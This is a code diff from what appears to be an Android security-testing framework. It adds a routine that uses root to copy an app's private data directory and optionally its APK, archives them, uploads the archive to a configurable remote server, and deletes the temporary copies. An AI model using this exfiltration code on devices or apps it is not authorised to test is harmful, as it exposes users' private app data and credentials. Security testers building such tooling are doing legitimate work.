@@ -3,42 +3,92 @@ package io.hakaisecurity.beerusframework.core.functions.sandboxExfiltration
 import java.io.File
 import io.hakaisecurity.beerusframework.core.utils.CommandUtils.Companion.runSuCommand
 import android.content.Context
+import android.util.Log
 import io.hakaisecurity.beerusframework.core.models.Application
+import okhttp3.Call
+import okhttp3.Callback
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.MultipartBody
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.Response
+import java.io.IOException
+import java.util.UUID
 
 class SandboxExfiltration {
+    private val client = OkHttpClient()
 
-    fun exfiltrateFile(context: Context, app: Application): String {
-        val sourceFile = File(app.artifactPath)
+    private fun sendFile(fileName: String, server:String, onComplete: (String) -> Unit) {
+        val sourceFile = File(fileName)
         if (!sourceFile.exists()) {
-            return "Arquivo de origem não encontrado: ${app.artifactPath}"
+            Log.d("{OUTPUT}","ERROR: Arquivo compactado não encontrado: $fileName")
+            onComplete("Arquivo compactado não encontrado: $fileName")
         }
 
-        val destinationDir = "/data/local/tmp/${app.identifier}"
-        val destinationPath = "$destinationDir/${sourceFile.name}"
+        val fileBody = sourceFile.asRequestBody("application/octet-stream".toMediaTypeOrNull())
+        var body = MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("file", sourceFile.name, fileBody).build()
+        val request = Request.Builder().url(server).post(body).build()
 
-        var resultMessage = ""
-
-        runSuCommand("mkdir -p $destinationDir") { mkdirResult ->
-            if (mkdirResult.isBlank()) {
-                resultMessage = "Erro ao criar diretório de destino: $mkdirResult"
-                return@runSuCommand
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.d("{OUTPUT}", "ERROR: Error ao enviar o arquivo")
+                onComplete("ERROR: Error ao enviar o arquivo")
             }
 
-            runSuCommand("cp -r ${sourceFile.absolutePath} $destinationPath") { copyResult ->
-                if (copyResult.isBlank()) {
-                    runSuCommand("ls $destinationPath") { check ->
-                        resultMessage = if (check.isNotBlank()) {
-                            "Arquivos exfiltrados com sucesso para: $destinationPath"
-                        } else {
-                            "Falha ao validar os arquivos copiados."
-                        }
-                    }
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) {
+                    Log.d("{OUTPUT}", "SUCCESS: Arquivo enviado com sucesso")
+                    onComplete("SUCCESS: Arquivo enviado com sucesso")
                 } else {
-                    resultMessage = "Erro ao copiar: $copyResult"
+                    Log.d("{OUTPUT}", "ERROR: Error ao enviar o arquivo")
+                    onComplete("ERROR: Error ao enviar o arquivo")
+                }
+            }
+        })
+
+    }
+
+    fun prepareFileToSend(destinationPath: String, server: String, isUSB: Boolean, onComplete: (String) -> Unit) {
+        runSuCommand("tar -czf $destinationPath.tar.gz $destinationPath/*") { tarResult ->
+            if (tarResult.isBlank()) {
+                onComplete("fail")
+            } else {
+                runSuCommand("chmod 655 $destinationPath.tar.gz") {
+                    if (!isUSB) {
+                        sendFile(fileName="$destinationPath.tar.gz", server=server) { R ->
+                            runSuCommand("rm -rf $destinationPath") {}
+                            runSuCommand("rm -rf $destinationPath.tar.gz") {}
+                            onComplete("success")
+                        }
+                    } else {
+                        onComplete("success")
+                    }
                 }
             }
         }
+    }
 
-        return resultMessage
+    fun exfiltrateFile(context: Context, app: Application, server:String, addBinary: Boolean, isUSB: Boolean, onComplete: (String) -> Unit) {
+        val sourceFile = File(app.artifactPath).parent
+
+        val destinationPath = "/data/local/tmp/${app.identifier}"
+        val dataPath = "/data/data/${app.identifier}"
+
+        runSuCommand("mkdir $destinationPath") {
+            runSuCommand("cp -r $dataPath $destinationPath") {
+                if (addBinary) {
+                    runSuCommand("cp -r $sourceFile/*.apk $destinationPath") {
+                        prepareFileToSend(destinationPath, server, isUSB) { status ->
+                            onComplete(status)
+                        }
+                    }
+                } else {
+                    prepareFileToSend(destinationPath, server, isUSB) { status ->
+                        onComplete(status)
+                    }
+                }
+            }
+        }
     }
 }
